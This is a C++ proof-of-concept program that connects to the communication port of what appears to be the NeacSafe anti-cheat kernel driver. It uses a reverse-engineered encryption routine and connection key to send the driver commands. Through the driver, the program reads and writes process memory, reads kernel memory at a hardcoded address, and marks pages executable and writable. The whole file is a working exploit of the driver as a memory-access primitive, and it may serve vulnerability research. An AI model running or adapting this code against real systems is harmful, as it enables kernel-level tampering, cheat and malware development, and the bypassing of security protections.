#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <FltUser.h>
#pragma comment(lib, "fltLib.lib")

struct NeacSafeConnectContext
{
	DWORD flag;
	DWORD flag2;
	char key[0x20]{ 0 };
};

__int64  decrypt_buffer(DWORD* a1, int a2)
{
	int i; // er10
	char* v4; // r9
	int j; // ecx
	char v6; // r8
	__int64 result; // rax
	char buffer[24]; // [rsp+0h] [rbp-28h] BYREF

	buffer[9] = a2 ^ 0x54;
	buffer[8] = a2 ^ 0x7A;
	buffer[0x10] = a2 ^ 0x7A;
	buffer[0xA] = a2 ^ 0xE5;
	buffer[0x11] = a2 ^ 0xBD;
	buffer[0xB] = a2 ^ 0x41;
	buffer[19] = a2 ^ 0xBD;
	buffer[0xC] = a2 ^ 0x8B;
	buffer[0xD] = a2 ^ 0xDB;
	buffer[0xE] = a2 ^ 0xB0;
	buffer[0xF] = a2 ^ 0x55;
	buffer[18] = a2 ^ 1;
	buffer[20] = a2 ^ 0x1A;
	buffer[21] = a2 ^ 0x7F;
	buffer[22] = a2 ^ 0x9E;
	buffer[23] = a2 ^ 0x17;
	for (i = 0; i < 4; ++i)
	{
		v4 = buffer;
		*(DWORD*)buffer = a2 ^ *a1;
		for (j = 0; j < 4; ++j)
		{
			++v4;
			v6 = j | ((BYTE)j << j) | buffer[0xF - (((unsigned __int8)j + (unsigned __int8)i) & 0xF) + 8];
			*(v4 - 1) ^= v6 | 4;
		}
		result = *(DWORD*)buffer ^ (unsigned int)~a2;
		*a1++ = result;
	}
	return result;
}

void encrypt(void * buffer,int len) {
	auto p = (char *)buffer;
	int i = 0;
	do
	{
		decrypt_buffer((DWORD*)p, i++);
		p = p + 0x10;
	} while (i < len >> 4);// InputBufferLength_ * 0x10


}


int main()
{

	HANDLE filter_port = INVALID_HANDLE_VALUE;
	NeacSafeConnectContext context {0};
	if(sizeof(context) != 0x28) {
		printf("[bingji] NeacSafeConnectContext len != 0x28\n");
		return 1;
	}
	context.flag = 'XXOO';
	context.flag2 = 4;
	DWORD result = FilterConnectCommunicationPort(L"\\NeacSafePort", 0, &context, sizeof(context), NULL, &filter_port);
	if (result != S_OK) {
		printf("[bingji] FilterConnectCommunicationPort error ,code:%x\n", result);
		return 1;
	}
	printf("[bingji] connect success.\n");


	
	{
		//query memory image
		char input[128]{ 3 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)GetModuleHandleA("user32"); //query address
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%ws ,%llx %llx\n",output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}

	{
		//query memory info
		char input[128]{ 4 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)GetModuleHandleA("user32"); //query address
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%ws ,%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}


	
	{
		//read process image
		char input[128]{ 5 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%ws ,%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}

	{
		//query process commandline
		char input[128]{ 6 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%ws ,%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}

	{
		//query process dir
		char input[128]{ 7 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%ws ,%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}
	
	{
		//query process time
		char input[128]{ 8 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}


	{
		//read process memory
		char input[128]{ 9 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)&main;
		*(unsigned int*)(input + 0xD) = 32;
		
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}


	{
		//query process memory
		
		char input[128]{ 10 };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)&main;

		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}

	{

		char input[128]{ 11 };
		strcpy(input + 1, "fltMgr.sys");
	
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}

	{

		char input[128]{ 0xe };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned int*)(input + 9) = 32;

		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}


	{
		//read kernel memory / ipi
		char input[128]{ 0xe };
		*(unsigned __int64*)(input + 1) = 0xFFFFF800EB01D000;
		*(unsigned int*)(input + 9) = 32;

		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
	}


	{
		//write process memory
		int temp_buffer[0x32]{ 0 };

		//write process memory
		char input[128]{ 0x3d };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)temp_buffer;
		*(unsigned int*)(input + 0xD) = 0x32;

		char output[128]{ 0x90,0x90,0x90,0x90 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
		printf("temp_buffer:%x\n", *(unsigned int*)temp_buffer);
	}
	
	{
		//set process memory protect
		int temp_buffer[0x32]{ 0 };

		//write process memory
		char input[128]{ 0x3c };
		*(unsigned int*)(input + 1) = GetCurrentProcessId();
		*(unsigned __int64*)(input + 5) = (unsigned __int64)&main;
		*(unsigned int*)(input + 0xD) = 0x32;
		*(unsigned int*)(input + 0x11) = PAGE_EXECUTE_READWRITE ;
		
		char output[128]{ 0 };
		DWORD bytes = 0;

		encrypt(input, sizeof(input));
		result = FilterSendMessage(filter_port, input, sizeof(input), output, sizeof(output), &bytes);
		printf("[bingji] FilterSendMessage result:%x\n", result);
		printf("%llx %llx\n", output, *(unsigned __int64*)output, *(unsigned __int64*)(output + 8));
		
	}
	Sleep(-1);
	return 1;
}

